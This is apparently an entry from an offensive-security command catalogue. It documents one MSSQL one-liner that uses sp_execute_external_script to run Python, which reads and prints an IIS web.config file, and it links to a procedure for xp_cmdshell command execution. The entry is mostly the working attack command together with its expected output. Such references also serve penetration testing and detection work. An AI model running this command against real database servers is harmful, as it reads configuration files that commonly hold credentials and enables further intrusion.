---
id: b5ae3201-3694-40b6-8fc3-06b6ce876382
name: mssql-sp-execute-external-script-read-file
type: command
executor: sql
data: >-
  EXEC sp_execute_external_script @language = N'Python', @script =
  N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())';
output: null
created_at: '2023-04-06T03:56:33.953785+00:00'
updated_at: '2023-04-10T20:22:46.090384+00:00'
platforms:
  - Windows
tags:
  - mssql
  - python-execution
  - file-read
verified: true
validated: true
---

# mssql-sp-execute-external-script-read-file

## Command

```sql
EXEC sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())';
```

## Description

Reads and prints the contents of a file using Python's open() in sp_execute_external_script.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| @script | Python code with file path | Yes |
| File path | Target file (e.g., C:\inetpub\wwwroot\web.config) | Yes |

## Examples

### Basic Usage

Adjust path as needed.

## Expected Output

File contents printed:

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
...
```

## Related

- [[procedures/MSSQL-Command-Execution-via-xp-cmdshell]]
